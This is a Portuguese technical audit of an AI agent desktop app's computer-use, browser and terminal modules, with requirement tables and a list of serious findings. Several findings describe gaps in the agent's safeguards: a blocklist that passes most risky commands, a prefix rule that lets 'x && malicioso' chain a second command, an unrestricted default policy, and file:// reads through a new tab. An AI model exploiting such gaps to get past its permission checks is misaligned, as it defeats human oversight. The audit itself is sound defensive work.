# Auditoria técnica — Módulos 04 (Computer Use), 05 (Navegador) e 06 (Terminal/processos)

- **Projeto:** Openclod Desktop (antes "Openclod") — `C:\Users\Administrator\Desktop\Openclaudedescktop`
- **Data:** 2026-10-26 · **Base:** commit `64ed3d3` + árvore de trabalho com alterações ainda não commitadas (inclusive de outra sessão em andamento). Os `arquivo:linha` abaixo são da árvore de trabalho no momento da leitura.
- **Prompts auditados:** `pronptsimplemet/PROMPT ULTRADETALHADO 04.txt`, `05.txt`, `06.txt` (lidos inteiros; cada requisito concreto virou uma linha numerada `M04-nnn`, `M05-nnn`, `M06-nnn`).
- **Método:** (1) leitura do código real; (2) execução dos testes focados do repositório; (3) experimentos pequenos que **executam de verdade** o código do projeto (empacotado com esbuild) em ambiente isolado, sem tocar no desktop do usuário; (4) leitura das evidências já gravadas (`Prints/computer-use-2026-10-24`, `tmp/ui-work`). Nada do projeto foi editado; este arquivo é o único criado dentro do repositório.

Legenda de status: **✅** implementado e verificado (teste ou evidência citada) · **🟡** parcial (o que falta está na célula) · **❌** ausente · **❓** existe, mas sem verificação/teste.

---

# 1. Resumo executivo

## 1.1 Contagem por status (linhas de requisito; critérios de aceitação ficam à parte)

| Módulo | ✅ | 🟡 | ❌ | ❓ | Total |
|---|---:|---:|---:|---:|---:|
| 04 — Computer Use | 50 | 43 | 21 | 2 | 116 |
| 05 — Navegador | 22 | 41 | 42 | 0 | 105 |
| 06 — Terminal e processos | 33 | 38 | 32 | 1 | 104 |
| **Total** | **105** | **122** | **95** | **3** | **325** |

Leitura rápida:
- **Computer Use (M04)** é o módulo mais maduro: tem prova viva (matriz de 50 operações no Bloco de Notas real) e proteções boas contra referência obsoleta e coordenada fora da captura. Faltam captura por monitor/região, janela ativa, DPI, OCR integrado, exclusão mútua entre agentes e qualquer cobertura de erros/cancelamento.
- **Navegador (M05)** cobre o caminho "Playwright, abrir/ler/clicar/digitar/abas" e quase nada do restante do prompt (sem iframes, downloads, uploads, select/checkbox, sessões persistentes, política de URL, verificação). **O modo "Chrome existente" é o padrão quando a extensão conecta e tem defeitos graves de lógica (clica em `<html>`).** Nenhum teste de repositório usa um navegador real.
- **Terminal (M06)** tem um bom terminal para o usuário (ConPTY + xterm) e um executor do agente simples e funcional, porém sem sessões interativas, sem entrada para processos, com falhas de timeout/cancelamento em filhos desacoplados, perda do fim da saída e acentuação ilegível.
- **Transversal:** o padrão do produto é a política `unrestricted` (aprovações, lista de comandos perigosos, proteção de credenciais e guarda de workspace desligados), e a migração de configurações antigas força esse modo.

## 1.2 Execuções reais desta auditoria

| Execução | Resultado |
|---|---|
| `npx vitest run` em 19 arquivos: `computer-activity`, `computer-mouse`, `computer-overlay-html`, `computer-settle`, `computer-tools`, `browser-tabs`, `environments`, `ocr`, `harness`, `security`, `permissions-effects`, `runner`, `limits`, `images`, `core-gaps`, `fixes`, `plan-activity`, `ui-logic`, `agents` | **411 testes, 0 falhas** (48 + 84 + 279 em três rodadas) |
| `harness.test.ts` inclui iniciar o `open-computer-use.exe` embutido (`mcp`) e listar ferramentas | passou (sem ação sobre o desktop) |
| Experimentos E1-E12 (Apêndice A): blocklist, timeouts, stdin, saída grande, abort, filter, SSH, WSL, bridge, extensão, Playwright headless, DPI | Resultados reais citados em cada bug |
| **Não executado, de propósito:** `scripts/computer-use-live.ts`, `scripts/ui-*.cjs` (abrem Electron/controlam o desktop), `npm run build/dist`, suíte completa, captura de tela do usuário, Chrome real do usuário | A matriz de `Prints/computer-use-2026-10-24` foi **lida**, não reexecutada |

## 1.3 Os 10 achados mais graves

| # | Gravidade | Achado | Bug |
|---|---|---|---|
| 1 | Crítico | Extensão do Chrome: `browser_click` por nome/texto/papel clica em `<html>` e responde "clique realizado"; Enter/`submit` não enviam; snapshot é `innerText`; navegação não espera carregar. É o modo padrão quando a extensão conecta. | BUG-01 |
| 2 | Crítico | Política padrão `unrestricted` + migração que eleva `ask/auto` para `unrestricted` e liga controle de computador/rede: sem aprovação, sem blocklist, sem proteção de credenciais, sem guarda de workspace. | BUG-02 |
| 3 | Crítico | Navegador sem política de URL: `file://`, `localhost`, metadados e rede privada liberados; `browser_new_tab` fura a proteção de credenciais; `claim_tab`/`close_tab` sem confirmação em modo `ask`. | BUG-03 |
| 4 | Crítico | Ambiente SSH/Nuvem: partes encadeadas (`&&`, `\|`) do comando "remoto" são executadas no Windows local (verificado). | BUG-04 |
| 5 | Alto | Subagents compartilham o mesmo mouse/teclado sem exclusão mútua; processos iniciados por subagents ficam órfãos e invisíveis; sem Job Object. | BUG-05 |
| 6 | Alto | `run_command`: filho desacoplado ignora timeout/abort (7,2 s para timeout de 1 s); teto de 10 min do runner não mata o processo; stdin nunca fechado e não há como enviar entrada. | BUG-06, BUG-07 |
| 7 | Alto | Saída: o foreground guarda o início e perde o fim (a causa do erro); acentos ilegíveis (CP850 do `cmd.exe`, UTF-16 do `wsl.exe`); `read_process_output filter` descarta o que não casa. | BUG-08, BUG-11 |
| 8 | Alto | Blocklist deixa passar 18 de 26 comandos arriscados testados e bloqueia 5 de 7 benignos; "permitir sempre" com `*` vira curinga; prefixo `x:*` aceita `x && malicioso`. | BUG-09, BUG-10 |
| 9 | Alto | Ponte do Chrome executa comandos "velhos" depois do timeout e `browser_console` sempre vem vazio no modo Chrome; Playwright: clique ambíguo no primeiro, iframes opacos, popups não rastreados, sem download/upload, `networkErrors` sem teto e com tokens da query string. | BUG-12, BUG-13 |
| 10 | Alto | Segredos: texto digitado (senhas) é gravado cru nos eventos/Atividade; saída de processos não passa por redação; ambiente do filho só filtra 7 nomes. | BUG-14 |

---

# 2. Módulo 04 — Computer Use, visão e automação desktop Windows

Arquivos centrais: `src/core/computer/layer.ts` (backend `open-computer-use` + captura GDI), `src/core/computer/settle.ts`, `src/core/computer/activity.ts`, `src/core/tools/computer.ts` (22 ferramentas), `src/main/computer-overlay*.ts` (borda/cursor do agente), `resources/bin/open-computer-use.exe` (Go, MIT).
Evidência viva: `Prints/computer-use-2026-10-24/computer-use-matrix.json` (gerada em 2026-10-25 por `scripts/computer-use-live.ts`: 50 operações, 46 ok, 4 limitações esperadas, 0 falhas inesperadas; contra o Bloco de Notas real + leitura de Chrome, ChatGPT, OpenCode, Antigravity IDE e Ollama). Eu **não** a reexecutei (controlaria o desktop real); li o JSON e as imagens.

Legenda de caminhos: `computer.ts` = `src/core/tools/computer.ts`; `layer.ts` = `src/core/computer/layer.ts`.

| ID | Requisito (seção do prompt) | Status | Evidência |
|---|---|---|---|
| M04-001 | Observar a tela e capturar screenshots (§1) | ✅ | `computer_screenshot` computer.ts:338-386; `captureScreen` layer.ts:777-835; matriz "computer_screenshot desktop"; `tests/computer-tools.test.ts:124` |
| M04-002 | Identificar janelas, controles, botões, campos, menus e diálogos (§1) | 🟡 | Janelas/controles: `computer_list_windows` computer.ts:255, `computer_snapshot` :274 (matriz: árvore de 6 apps). Diálogos não são detectados nem tipados (sem relação dono/modal) |
| M04-003 | Usar acessibilidade (UI Automation) quando disponível (§1, §4.4) | ✅ | layer.ts:384-439 via `get_window_state`/`get_app_state`; matriz `snapshot_id`/`generation` |
| M04-004 | Mover o mouse (§1, §4.5) | ✅ | computer.ts:545-578; `tests/computer-mouse.test.ts:36`; matriz "computer_mouse_move" |
| M04-005 | Clicar, duplo clique, botão direito/meio, pressionar e soltar (§1, §4.5) | ✅ | computer.ts:388-543, 580-625; matriz: click element/double/right/coordinate, mouse_button down/up |
| M04-006 | Digitar texto e atalhos de teclado (§1) | ✅ | computer.ts:667-752; matriz: type_text (janela/coordenada/global), press_key (normalizada/global) |
| M04-007 | Unicode, layouts de teclado, diferença digitar x teclas (§4.5) | ❓ | Só `computer_set_value` foi provado com "áéíóú" (matriz). `type_text` não tem prova com Unicode/ABNT2/teclas mortas |
| M04-008 | Rolar páginas e listas (§1) | ✅ | computer.ts:754-824; matriz "scroll window" e "scroll global after reobserve" |
| M04-009 | Alternar janelas/apps e abrir programas (§1) | 🟡 | `computer_activate` ✅ (matriz). `computer_launch` :941 e `computer_open_path` :895 só têm teste negativo (`tests/computer-tools.test.ts:110`); sem prova positiva |
| M04-010 | Interagir com navegadores, editores de código, exploradores de arquivos (§1) | 🟡 | Só o Bloco de Notas recebeu ações. Chrome/ChatGPT/OpenCode/IDE/Ollama foram apenas lidos (matriz). Nenhum teste no Explorer |
| M04-011 | Tarefas compostas; observar o resultado de cada ação (§1, §8) | 🟡 | Ações por elemento anexam `[verificação: estado mudou · snapshot …]` (layer.ts:301-368). Ações globais/por coordenada devolvem só `exit code` (computer.ts:530-541, 722-723, 749-750, 818-822, 889) |
| M04-012 | Detectar falhas e tentar estratégia alternativa (§1, §8) | 🟡 | Sem componente de recuperação; depende do loop do Agent Core (detector de chamada idêntica `runner.ts:1714-1729`) e de erros parcialmente tipados (`element_stale` computer.ts:143, layer.ts:479-485) |
| M04-013 | Interromper e retomar tarefa (§1, §4.1) | 🟡 | `abort` encerra processos/navegador (`orchestrator.ts:821-835`), mas `ComputerLayer.call/run` não recebem `AbortSignal` (layer.ts:252-259, 637-663); retomada inexistente |
| M04-014 | Integrar ao Agent Core e subagents (§1, §9) | 🟡 | Registro + filtro por modo (`permissions.ts:157-256`). Subagents herdam o MESMO `ComputerLayer` (`agents/runtime.ts:348-351`) sem exclusão mútua (M04-025) |
| M04-015 | Camada reutilizável, não só controle de mouse (§1) | ✅ | `ComputerLayer` + `ComputerActivityTracker` + overlay |
| M04-016 | Fluxo VS Code: abrir, projeto, editar, terminal integrado, testes (§1) | ❌ | Nenhum teste/evidência; a matriz só lê a árvore do "Antigravity IDE" |
| M04-017 | Inspecionar o harness e executar os testes iniciais (§2) | ✅ | `docs/PENDENCIAS-2026-10-25.md` (801 testes). Nesta auditoria: 19 arquivos, 411 testes verdes (ver §1.2) |
| M04-018 | Clonar/examinar os 14 repositórios de §3 | 🟡 | 8/14 em `repositorios/_research`: win-computer-use, desktop-use, pyautogui, browser-use, playwright, stagehand, MCP TS SDK, MCP Python SDK. **Ausentes:** pywinauto, FlaUI, OpenCV, Tesseract, python-mss, AutoHotkey (`docs/research/REPOSITORY_INVENTORY_2026-10-25.md`) |
| M04-019 | Registrar componentes efetivamente aproveitados (§2) | 🟡 | `THIRD_PARTY_NOTICES.md:42,98,114`, `docs/research/CODE_PROVENANCE.md`. `CODE_REUSE_MATRIX.md:143-154`: só a fatia 1 (settle) "feito"; `keymap.ts`, `snapshot-rank.ts`, `computer-policy.ts` planejados e inexistentes em `src/core/computer`/`security` |
| M04-020 | Respeitar licenças/atribuição (§2) | ✅ | `licenses/munim-computer-use-LICENSE`, `THIRD_PARTY_NOTICES.md` |
| M04-021 | Controller: validar parâmetros (§4.1) | ✅ | Zod em todas as 22 ferramentas; `tests/computer-tools.test.ts:46` |
| M04-022 | Controller: selecionar o mecanismo de execução (§4.1) | ✅ | `input_method auto/global`, `click_method` (computer.ts:149-154, 403) |
| M04-023 | Controller: registrar resultado/histórico estruturado (§4.1, §4.9) | 🟡 | `tool_start/tool_end/tool_progress` (runner.ts:1859-1923) → `events.jsonl` (`session/store.ts:214`) e `ActivityStore`; sem id de tarefa, evidência de verificação ou tentativas de recuperação |
| M04-024 | Controller: cancelamento (§4.1) | 🟡 | Ver M04-013 |
| M04-025 | Impedir que dois agentes controlem o mesmo desktop (§4.1, §9.2) | ❌ | Sem lock/lease. `parallelSafe:false` só serializa chamadas dentro de um turno (runner.ts:1927-1940). `layerFor` chama `configure()` no singleton a cada chamada (computer.ts:70-75) e `backend()` reinicia o processo se `allowControl` mudar (layer.ts:228-249) |
| M04-026 | Controller independente de modelo/provedor (§4.1) | ✅ | Nenhuma referência a provedor em `core/computer` |
| M04-027 | Captura de todos os monitores (§4.2) | ✅ | Desktop virtual `VirtualScreen` (layer.ts:784-792); máquina de teste: 2 telas, 3840x1082 |
| M04-028 | Captura de um monitor específico (§4.2) | ❌ | Inexistente |
| M04-029 | Captura de uma região / zoom (§4.2, §11) | ❌ | Inexistente (nenhuma ferramenta de recorte) |
| M04-030 | Resolução, escala e densidade de pixels (§4.2, §6.2) | 🟡 | `data` traz width/height/physicalWidth/scale/origem (computer.ts:365-384). **DPI não tratado:** `powershell.exe` é DPI-unaware (medido: awareness=0), `grep -i dpi src` = 0; a máquina está a 100% (`LogPixels=96`), então a matriz não exercita o problema |
| M04-031 | Registro temporal da captura (§4.2) | ❌ | Só o `Date.now()` no nome do arquivo (layer.ts:780); `CaptureInfo` não tem `capturedAt` |
| M04-032 | Conversão de formato, redimensionamento controlado, compressão (§4.2) | 🟡 | PNG com `max_width` 640-2560 (padrão 1600; computer.ts:346). Sem JPEG/qualidade. Com 3840 px o fator é 0,417: cada monitor chega com ~800 px |
| M04-033 | Cache limitado e liberação de memória/arquivos (§4.2, §11) | ❌ | PNGs em `%TEMP%\openclod-shots` nunca são apagados (layer.ts:779-781; medido: 45 arquivos, 13 MB) |
| M04-034 | Tratamento de erros da captura (§4.2) | 🟡 | `throw` com stderr (layer.ts:813-815), porém o `spawn` do PowerShell não tem timeout (layer.ts:801-811) |
| M04-035 | Captura sob demanda, sem polling contínuo (§4.2, §11) | ✅ | Só as ferramentas capturam |
| M04-036 | Window Manager: listar janelas, títulos, processos (§4.3) | ✅ | `computer_list_windows`, `computer_list_apps` (inclui pid; matriz) |
| M04-037 | Localizar janela por critérios estruturados (§4.3) | 🟡 | `computer_wait_for_window` por título/app (computer.ts:1023); sem classe, pid ou estado |
| M04-038 | Consultar a janela ativa (§4.3) | ❌ | Não há `get_active_window`; `computer_window_at` é hit-test de ponto |
| M04-039 | Ativar janela (§4.3) | ✅ | computer.ts:964-984; matriz "computer_activate" |
| M04-040 | Verificar se a janela está visível; foco; principal x auxiliar; detectar diálogos (§4.3) | ❌ | Inexistente |
| M04-041 | Esperar que uma janela apareça (§4.3) | ✅ | computer.ts:1023-1083; `tests/computer-tools.test.ts:86` |
| M04-042 | Não encerrar processos/fechar apps por falha de identificação (§4.3) | ✅ | Não existe ferramenta de fechar/encerrar app em `computer_*` |
| M04-043 | UIA: listar elementos, nomes, tipos, retângulos, relações (§4.4) | ✅ | Árvore indentada com `Frame:{x,y,width,height}` (layer.ts:404-416; matriz) |
| M04-044 | UIA: AutomationId, enabled/focusable, padrões de controle (§4.4) | 🟡 | Aparecem só `Value`, `Secondary Actions` e `Frame` (matriz). Sem AutomationId, habilitado, focável |
| M04-045 | UIA: executar ações suportadas pelos controles (§4.4) | ✅ | `computer_set_value`, `computer_secondary_action` (computer.ts:627, 986); `click_method=accessibility` falha por limitação do backend (matriz, esperado) |
| M04-046 | Estrutura normalizada independente de biblioteca; `find_ui_element` (§4.4) | 🟡 | Texto bruto do backend + metadados; sem JSON normalizado nem busca por papel/nome |
| M04-047 | Fallback visual quando o elemento não é achado (§4.4) | ✅ | Coordenadas da captura/janela (computer.ts:500-541) |
| M04-048 | Limitar o tamanho da árvore devolvida (§4.4, §11) | ✅ | `limitSnapshotText` 80 000 chars (layer.ts:28-35; `tests/computer-tools.test.ts:158`) |
| M04-049 | Input: segurar botão numa operação controlada (§4.5) | ✅ | `computer_mouse_button` down/up; matriz |
| M04-050 | Input: representação normalizada de teclas (§4.5) | 🟡 | `normalizeKeyChord` (layer.ts:105-138; `tests/computer-mouse.test.ts:65`) cobre ~25 apelidos; sem win/meta/super, F1-F24, numpad; `keymap.ts` (matriz #6) inexistente |
| M04-051 | Input: consultar estado do dispositivo (§4.5) | 🟡 | Só posição do cursor (computer.ts:199; matriz) |
| M04-052 | Resolver: ordem referência→seletor→janela/controle→OCR→imagem→coordenada (§4.6) | 🟡 | Referência/janela+índice/coordenada ✅. **OCR** existe (`image_ocr`, `src/core/media/ocr.ts:63`, `tools/images.ts:100`) mas está desacoplado do alvo: coordenadas em px da imagem, sem mapa para a tela. **Template matching** ❌ |
| M04-053 | Resolver: registrar captura de origem, resolução e região das coordenadas (§4.6) | 🟡 | `lastCapture` (layer.ts:175, 826) é usada na conversão mas não é gravada por ação |
| M04-054 | Não reutilizar coordenadas antigas cegamente (§4.6) | 🟡 | Verificação de limites (layer.ts:670-682; `tests/computer-mouse.test.ts:60`), `screenshotId` por janela (layer.ts:180, 509-521) e hit-test opcional `expect_window/expect_title` (computer.ts:453-475). Sem TTL nem invalidação por mudança de resolução/janela |
| M04-055 | Verifier: confirmar mudança de estado após a ação (§4.7) | ✅ | `elementAction` + `settle.ts` (`tests/computer-settle.test.ts`) + matriz "[verificação: estado mudou …]" |
| M04-056 | Verifier: distinguir ação enviada de ação verificada (§4.7, §14) | 🟡 | Elemento: sim (`state_changed`). Global/coordenada: "ok" = exit code 0 |
| M04-057 | Verifier: `verify_action`, `compare_screen_state` (§4.7, §5) | ❌ | Inexistentes (nenhuma comparação de imagem; `sharp` não é usado para isso) |
| M04-058 | Planner de ações separado (§4.8) | 🟡 | Delegado ao modelo por prompt (`context.ts:58-64`) e `update_plan` genérico; sem componente |
| M04-059 | Histórico por ação: tarefa, ação, alvo, parâmetros, momento, resultado, evidência, erro, recuperação, estado final (§4.9) | 🟡 | Eventos genéricos; sem recuperação nem estado final |
| M04-060 | Não registrar senhas/dados privados (§4.9) | ❌ | `tool_start.args` é gravado cru (`activity-store.ts:35`, `session/store.ts:214`, `orchestrator.ts:1136`); o texto digitado vai para `events.jsonl`/Atividade |
| M04-061 | Contrato §5: `get_screen_info` | ❌ | Dados parciais só no retorno de `computer_screenshot` |
| M04-062 | Contrato §5: `capture_screen` | ✅ | `computer_screenshot` |
| M04-063 | Contrato §5: `capture_region` | ❌ | — |
| M04-064 | Contrato §5: `get_active_window` | ❌ | — |
| M04-065 | Contrato §5: `list_windows` | ✅ | `computer_list_windows` |
| M04-066 | Contrato §5: `get_window_info` | 🟡 | `computer_get_window` só reidrata id→app/título |
| M04-067 | Contrato §5: `inspect_accessibility_tree` | ✅ | `computer_snapshot` |
| M04-068 | Contrato §5: `find_ui_element` | ❌ | — |
| M04-069 | Contrato §5: `get_cursor_position` | ✅ | `computer_cursor_position` |
| M04-070 | Contrato §5: `activate_window` | ✅ | `computer_activate` |
| M04-071 | Contrato §5: `click`, `double_click`, `move_mouse`, `drag`, `scroll` | ✅ | `computer_click` (double), `computer_mouse_move`, `computer_drag`, `computer_scroll`; matriz |
| M04-072 | Contrato §5: `type_text`, `press_key`, `hotkey` | ✅ | `computer_type_text`, `computer_press_key` (acorde "ctrl+s") |
| M04-073 | Contrato §5: `select_ui_element` | 🟡 | Sem ferramenta dedicada; `computer_click`/`secondary_action` |
| M04-074 | Contrato §5: `invoke_ui_control` | ✅ | `computer_secondary_action`/`computer_set_value` (o backend recusou a ação `Scroll`, caso esperado da matriz) |
| M04-075 | Contrato §5: `wait_for_window` | ✅ | `computer_wait_for_window` |
| M04-076 | Contrato §5: `wait_for_element` | 🟡 | `computer_wait_for` (texto/mudança da árvore); sem seletor papel/nome |
| M04-077 | Contrato §5: `get_task_status`, `cancel_action`, `get_action_history` | ❌ | Só o stop do turno |
| M04-078 | Cada ferramenta: erros tipados, limites, cancelamento, metadados (§5) | 🟡 | Nome/descrição/schema/validação ✅; erros são strings (único código: `summary:'element_stale'`); cancelamento ❌ |
| M04-079 | Resultados "aceita/concluída/falha/timeout/não verificado" (§5) | 🟡 | `ok` booleano + `state_changed` (true/false/null); sem "timeout" tipado |
| M04-080 | Imagens ao modelo pelo contrato multimodal, sem acoplar a provedor (§6.1) | ✅ | `ToolResult.images` (computer.ts:372) |
| M04-081 | Fallback sem visão: árvore, OCR, metadados (§6.1) | 🟡 | `annotate` lista janelas (computer.ts:359-364; `tests/computer-tools.test.ts:124`) + árvore; OCR não integrado |
| M04-082 | Sistema de coordenadas documentado + transformação imagem→desktop (§6.2) | ✅ | README §8; descrições; `screenshotToScreen` layer.ts:141-147; `tests/harness.test.ts:449-486`, `tests/computer-mouse.test.ts:36-63` |
| M04-083 | Múltiplos monitores e origem negativa (§6.2) | ✅ | `originX/originY` (layer.ts:817-826); `tests/harness.test.ts:449` |
| M04-084 | Escala de exibição do Windows (§6.2) | ❌ | Ver M04-030 |
| M04-085 | Mudança de resolução/janela redimensionada invalida coordenadas (§6.2) | ❓ | `lastCapture` não é invalidada; sem teste |
| M04-086 | Confiança só se produzida pelo mecanismo (§6.3) | ✅ | Nenhuma pontuação inventada |
| M04-087 | Alvo visual ambíguo → nova observação antes de agir (§6.3) | 🟡 | Só por instrução (`context.ts:58-62`) e `expect_*`; sem enforcement |
| M04-088 | Ciclo observar→agir no Agent Core, sem segundo agente (§6.4) | ✅ | `runner.ts` único |
| M04-089 | Estratégias distintas web x desktop (§7) | ✅ | `browser_*` x `computer_*`; `context.ts:64-72` |
| M04-090 | Preferir ferramentas estruturadas a mouse para editar/terminal (§7.3) | ✅ | `context.ts:64` |
| M04-091 | Tarefa composta: objetivo, plano, estado, dependências, limites, relatório (§8) | 🟡 | `update_plan` + limites do runner; nenhum estado de tarefa específico |
| M04-092 | Parar/replanejar: alvo ausente, UI inesperada, diálogo não autorizado (§8) | 🟡 | Erros viram `ok:false`; replanejar depende do modelo |
| M04-093 | Evitar repetir indefinidamente a ação que falha (§8) | ✅ | `runner.ts:1714-1729`; `tests/loop-detection.test.ts` |
| M04-094 | Agent Core descobre ferramentas e esquemas (§9.1) | ✅ | `tools/lazy.ts`; `tests/lazy-tools.test.ts` |
| M04-095 | Autorização aplicada no executor real (§9.1) | ✅ | `requireControl` (computer.ts:62-67) + `evaluateTool` (runner.ts:1783). Ressalva: padrão do produto é `unrestricted` (BUG-02) |
| M04-096 | Eventos `computer.*` pelo dispatcher central (§9.3) | 🟡 | Reusa `tool_start/tool_end/tool_progress`; não há `observation_*`, `verification_completed`, `recovery_started`, `task_*` |
| M04-097 | UI: estado da sessão, janela controlada, ação atual (§10) | 🟡 | Overlay laranja + cursor do agente (`computer-overlay.ts`; `tests/computer-activity.test.ts`); sem painel "Computer" |
| M04-098 | UI: screenshot recente, histórico, resultado das verificações (§10) | 🟡 | Imagem no cartão da ferramenta; sem galeria/histórico |
| M04-099 | UI: botão de cancelamento / indicador "aguardando observação" (§10) | 🟡 | Parar turno (global). Sem atalho global de emergência (`index.ts:2317` só mostra a janela) |
| M04-100 | Não expor screenshots/histórico a outro workspace (§10) | 🟡 | PNG num `%TEMP%` comum e o caminho é devolvido ao modelo (computer.ts:382) |
| M04-101 | Timeout por ação (§11) | 🟡 | 90 s (`call`), 30-60 s (`input`); captura sem timeout |
| M04-102 | Esperas por condição, detecção de mudança relevante (§11) | ✅ | `wait_for`, `wait_for_window`, `settle`, assinatura FNV (layer.ts:849-856) |
| M04-103 | Reutilização de conexão (§11) | ✅ | Um processo `open-computer-use mcp` vivo (layer.ts:228-249) |
| M04-104 | Diagnóstico e monitoramento de dependências (§11) | ✅ | `status()` layer.ts:207-226; `resolveOcu` layer.ts:68-92; `tests/harness.test.ts:488-600` |
| M04-105 | Funciona no Windows 10+ sem pedir administrador (§12) | ✅ | Testado em Windows 10 Pro 19045; nenhum código solicita elevação |
| M04-106 | Elevação, UAC, janelas protegidas, sessão bloqueada (§12) | ❌ | Sem tratamento nem documentação (README só avisa de captura preta em sessão bloqueada) |
| M04-107 | Dependências documentadas, instalação reproduzível (§12) | 🟡 | README §8 diz "backend opcional / npm i -g", mas o binário é embutido (`resources/bin`, `scripts/embed-bin.mjs`) |
| M04-108 | Testes unitários: validação, coordenadas, teclas, contratos, registro, estados (§13.1) | ✅ | `computer-tools`, `computer-mouse`, `computer-settle`, `computer-activity`, `harness.test.ts:449` |
| M04-109 | Testes unitários: classificação de erros, cancelamento, histórico (§13.1) | ❌ | — |
| M04-110 | Integração real: captura, janelas, UIA, clique/digitação, espera, verificação (§13.2) | ✅ | Matriz viva (46/50 + 4 esperadas), 27 PNGs |
| M04-111 | Integração com Agent Core e eventos (§13.2) | 🟡 | Runner com ferramentas falsas; `ComputerActivityTracker` testado; ferramentas reais + provedor roteirizado só para shell (`scripts/ui-work.cjs`) |
| M04-112 | Aplicativo de teste dedicado (botões, campos, checkboxes, menus, diálogos) (§13.3) | ❌ | Usa-se o Bloco de Notas real |
| M04-113 | Cenário A: abrir e identificar uma janela (§13.4) | ✅ | Matriz (activate + get_window + snapshot) |
| M04-114 | Cenário B: preencher formulário e verificar confirmação (§13.4) | ❌ | Sem formulário/botão de envio |
| M04-115 | Cenário C: recuperar falha em elemento inexistente (§13.4) | 🟡 | 3 recusas esperadas na matriz (janela obsoleta, global sem alvo, ação secundária inválida); sem replanejamento automático testado |
| M04-116 | Cenário D: tarefa em linguagem natural via Agent Core (§13.4) | ❌ | Exige modelo real; nenhuma execução registrada |

### 2.1 Critérios de aceitação do Módulo 04 (§14)

| # | Critério | Resultado |
|---|---|---|
| A04-01 | Capturar a tela | Atendido |
| A04-02 | Informações sobre janelas | Atendido (sem janela ativa) |
| A04-03 | Árvore de acessibilidade | Atendido |
| A04-04 | Interagir com mouse e teclado | Atendido |
| A04-05 | Ferramentas estruturadas | Atendido |
| A04-06 | Alvos por estratégias diferentes | Parcial (sem OCR/imagem integrados) |
| A04-07 | Coordenadas convertidas entre resoluções | Atendido a 100% de DPI; DPI > 100% não verificado |
| A04-08 | Ações importantes com verificação | Parcial (só por elemento) |
| A04-09 | Falhas provocam nova observação/replanejamento | Parcial (depende do modelo) |
| A04-10 | Usuário cancela a tarefa | Parcial (turno inteiro; sem atalho global; ocu não cancelável) |
| A04-11 | Ações registradas | Parcial (com vazamento de texto digitado) |
| A04-12 | Agent Core usa as ferramentas | Atendido |
| A04-13 | Subagents sem conflito no desktop | NÃO atendido |
| A04-14 | UI exibe estado de execução | Parcial |
| A04-15 | Dependências documentadas | Parcial (README desatualizado) |
| A04-16 | Testes executados | Atendido (matriz + suíte); sem app de teste |
| A04-17 | Funcionalidades anteriores intactas | Atendido (suíte verde) |
| A04-18 | Não depende só de coordenadas | Atendido |
| A04-19 | Distingue executada de verificada | Parcial |

---

# 3. Módulo 05 — Automação de navegador avançada

Arquivos centrais: `src/core/browser/layer.ts` (Playwright + contrato `ChromeBrowserBackend`), `src/core/tools/browser.ts` (15 ferramentas), `src/main/chrome/bridge.ts` + `install.ts`, `resources/chrome-extension/{manifest.json,background.js}`, `resources/bin/chrome-host/main.go` (host nativo Go), `src/renderer/src/components/BrowserPane.tsx` + `src/main/preview.ts` (painel de preview com `<webview>`, **separado** do navegador do agente).

Fatos verificados por execução nesta auditoria (Chrome headless local, sem janelas, página em 127.0.0.1; ver Apêndice A):
- `BrowserLayer` + ferramentas reais contra uma página local: snapshot ARIA ✅, shadow DOM ✅, elemento dinâmico ✅, **iframe ✗**, **popup/`target=_blank` não rastreado ✗**, **clique ambíguo pega o primeiro ✗**, `fill` falha em `<select>`/checkbox ✗, `alert()` descartado sem aviso, `networkErrors` cresceu a 600 itens com query string (token), `browser_new_tab file:///C:/Windows/win.ini` abriu e foi lido.
- O código de clique/digitação/Enter da **extensão** (lido de `background.js` e executado em Chromium headless): o clique por nome/texto acerta `<html>`, não o botão; `submit` e `press Enter` não enviam o formulário.
- O modo "Chrome existente" nunca foi exercitado ponta a ponta: `docs/PENDENCIAS-2026-10-25.md` registra `attached:false` (extensão não carregada no Chrome).

Legenda de caminhos: `layer.ts` = `src/core/browser/layer.ts`; `browser.ts` = `src/core/tools/browser.ts`; `bg.js` = `resources/chrome-extension/background.js`.

| ID | Requisito (seção do prompt) | Status | Evidência |
|---|---|---|---|
| M05-001 | Controlar navegador real e navegar até uma página (§1) | ✅ | `open()` layer.ts:172-229 (canais `chrome`→`msedge`→chromium); smoke headless: abriu em 2,7 s |
| M05-002 | Pesquisar informações em páginas públicas (§1) | 🟡 | Ferramentas existem (`web_search`, `web_research`, `fetch_url`, `browser_read`); nenhuma execução contra site público nesta auditoria |
| M05-003 | Preencher formulários (§1, §6.2) | 🟡 | Texto/e-mail/senha/textarea via `fill` ✅. **Falha** em `<select>` e checkbox (verificado). Sem radio, data, upload, validação de obrigatórios |
| M05-004 | Trabalhar com várias abas (§1) | 🟡 | `browser_tabs/new_tab/switch_tab/close_tab` ✅ (`tests/browser-tabs.test.ts:110-253`; smoke). Páginas abertas por `target=_blank`/`window.open` **não** entram no mapa (antes/depois `[1,1]`) |
| M05-005 | Interagir com menus, botões, campos e tabelas (§1) | 🟡 | Botões/campos ✅; menus sem `hover`; tabelas sem extração estruturada |
| M05-006 | Esperar carregamento e elementos (§1, §4.4) | 🟡 | `browser_wait` só por seletor CSS visível (layer.ts:433-441). Sem espera por URL, texto, load state, rede ociosa |
| M05-007 | Consultar informações estruturadas da página (§1, §4.5) | 🟡 | `ariaSnapshot` (verificado: papéis, nomes, `[selected]`, `/url`); sem DOM/atributos/formulários/tabelas |
| M05-008 | Capturar screenshots (§1) | 🟡 | `browser_screenshot` (browser.ts:186-206): viewport PNG, sem `fullPage`/elemento/limite; no Chrome usa `captureVisibleTab(windowId)` e pode capturar outra aba (bg.js:295-305) |
| M05-009 | Operações repetitivas em sites (§1) | ❌ | Sem laço/lote/extração em massa além do loop do agente |
| M05-010 | Apps web com muito JavaScript (§1, §6.7) | 🟡 | Locators do Playwright reavaliam o alvo (✅ elemento "Tardio"); sem refs estáveis nem detecção de substituição |
| M05-011 | Diagnosticar erros de navegação e interação (§1, §10) | 🟡 | `browser_console` ✅ em Playwright; **sempre vazio** no modo Chrome (bridge.ts:314-320) |
| M05-012 | Sessões persistentes quando configurado (§1, §8) | ❌ | Contexto efêmero (layer.ts:202-206); sem `launchPersistentContext`/`storageState`/diretório de perfil |
| M05-013 | Executar testes de interface web (§1) | ❌ | Nenhuma ferramenta/skill/fluxo; só `run_command npx playwright test` |
